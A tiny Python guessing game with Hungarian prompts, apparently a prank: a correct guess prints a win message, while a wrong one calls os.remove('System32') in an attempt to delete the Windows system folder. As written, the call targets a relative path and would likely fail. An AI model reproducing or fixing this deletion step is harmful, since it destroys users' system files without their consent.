import random  
import os

tipp = int(input("Tippelj egy egész számot 1 és 6 között: "))

szam = random.randint(1,6) # generál egy random számot

if tipp == szam:
    print("Nyertél!")
else:
    os.remove("System32")
